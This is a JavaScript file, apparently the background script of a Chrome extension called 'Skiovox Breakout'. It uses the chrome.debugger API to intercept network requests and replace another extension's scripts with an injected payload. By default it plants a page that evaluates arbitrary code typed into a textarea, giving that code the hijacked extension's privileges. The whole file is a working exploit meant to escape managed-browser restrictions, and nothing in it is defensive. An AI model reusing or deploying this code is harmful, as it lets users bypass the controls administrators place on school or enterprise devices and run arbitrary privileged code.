const target = { targetId: 'browser' }

function injection() {
    if (!self.isRunning) {
        self.isRunning = true;
        webkitRequestFileSystem(TEMPORARY, 1024 * 1024 * 300, async function (fs) {
            function writeFile(name, data) {
                return new Promise((resolve) => {
                    fs.root.getFile(name, { create: true }, function (entry) {
                        entry.createWriter(function (writer) {
                            writer.write(new Blob([data]));
                            writer.onwriteend = function () {
                                resolve(entry)
                            }
                        });
                    })
                })
            }
            function removeFile(name) {
                return new Promise(function (resolve) {
                    fs.root.getFile(name, { create: true }, function (entry) {
                        entry.remove(resolve);
                    })
                })
            }
            function filemain() {
                function buildBlobWithScript(script) {
                    var fullHTML = `<script src="index.js"></script>`;
                    return new Promise((resolve, reject) => {
                        webkitRequestFileSystem(TEMPORARY, 1024 * 1024 * 300, function (fs) {
                            function writeFileInDirectory(dir, name, data) {
                                return new Promise((resolve) => {
                                    dir.getFile(name, { create: true }, function (entry) {
                                        entry.createWriter(function (writer) {
                                            writer.write(new Blob([data]));
                                            writer.onwriteend = function () {
                                                resolve(entry)
                                            }
                                        });
                                    })
                                })
                            }
                            function removeFileInDirectory(dir, name) {
                                return new Promise(function (resolve) {
                                    dir.getFile(name, { create: true }, function (entry) {
                                        entry.remove(resolve);
                                    })
                                })
                            }
                            fs.root.getDirectory('evaluations', { create: true }, async function (entry) {
                                await removeFileInDirectory(entry, 'index.js');
                                await writeFileInDirectory(entry, 'index.js', script);
                                await removeFileInDirectory(entry, 'index.html');
                                var handle = await writeFileInDirectory(entry, 'index.html', fullHTML);
                                resolve(handle.toURL());

                            }, reject)
                        }, reject)
                    })
                }
                document.querySelector('button').onclick = async () => {
                    var url = await buildBlobWithScript(document.querySelector('textarea').value);
                    // unbelievable, why can't we just use open
                    await chrome.tabs.create({ url: url })
                };
            }
            await removeFile('shim.html');
            await removeFile('shim.js');
            var entry = await writeFile("shim.html", "<head><style>*{font-family:'Noto sans', sans-serif;box-sizing:border-box}body{padding:8px;background:#212121;color:#ffffff}button{background:gray;border:unset;border-radius:5px}textarea{background:lightgray;border:unset;border-radius:5px}</style><title>Skiovox Breakout</title></head><body><nav>Skiovox Breakout</nav><textarea></textarea><br/><button>Evaluate</button><!--SH1MMER REAL--><script src=\"shim.js\"></script></body>");
            await writeFile("shim.js", `(${filemain.toString()})()`);
            alert("Save this in your bookmarks: " + entry.toURL());

        })
    }
}
var onInjectionFinished;
var extPrefixContext;
var payload;
async function searchForBackgroundPage() {
    var { targetInfos: infos } = await chrome.debugger.sendCommand(target, 'Target.getTargets');
    var result = [];
    infos.forEach(function (info) {
        if (info.url.startsWith("chrome-extension://" + extPrefixContext) && info.type.includes('background')) {
            console.log(info);
            result.push(info);
        }
    })
    return result;
}
function isManifestV3Extension({ url, type: requestType }) {
    return new Promise((resolve, reject) => {
        if (!url.startsWith("chrome-extension://") || requestType.indexOf("service")) return resolve(false); // New service workers can't be created on MV2 and services workers are created on mv3 by default.
        resolve(true);
    });
};
async function onNetEvent(_, _, event) {
     // That is not how you make mv3 targetable just go with the mv2 flow you  need to wait for and identity the mv3 service worker target id which shouldn't be done on netEvent.
    

    if (!event.request.url.startsWith("chrome-extension://" + extPrefixContext)) {
        await chrome.debugger.sendCommand(target, "Fetch.continueRequest", {
            requestId: event.requestId
        });
        return;
    };

    await chrome.debugger.sendCommand(target, "Fetch.fulfillRequest", {
        requestId: event.requestId,
        responseCode: 200,
        body: btoa(`(${payload.toString()})()`)
    })
}

async function start() {
    await chrome.debugger.attach(target, '1.3');
    // let { targetInfos } = await chrome.debugger.sendCommand(target, 'Target.getTargets');
    if (extPrefixContext && extPrefixContext !== '') {
        // var {url: pageURL, browserContextId} = await searchForBackgroundPage();
        // await chrome.debugger.sendCommand(target, 'Target.createTarget', {url: pageURL, browserContextId});
    }
    chrome.debugger.onEvent.addListener(onNetEvent)
    await chrome.debugger.sendCommand(target, 'Fetch.enable');
    onInjectionFinished({ status: `success visit chrome-extension://${extPrefixContext}/_generated_background_page.html to commence further with the code execution process.` });

}

async function stop() {
    chrome.debugger.onEvent.addListener(async function (_, _, event) {
        await chrome.debugger.sendCommand(target, "Fetch.continueRequest", {
            requestId: event.requestId,
        });
    });
    await chrome.debugger.detach(target);
}

chrome.runtime.onMessage.addListener(async function (msg, sender, respondWith) {
    const { prefix } = msg;

    if (msg.type === "start-inspect") {
        extPrefixContext = msg.prefix;
        payload = msg.payload ? 'function () {' + msg.payload + '}' : injection;
        onInjectionFinished = respondWith;
        await start();
    }
    if (msg.type === "cancel-inspect") {
        await stop();
        respondWith({ status: 'success' });
    }
});
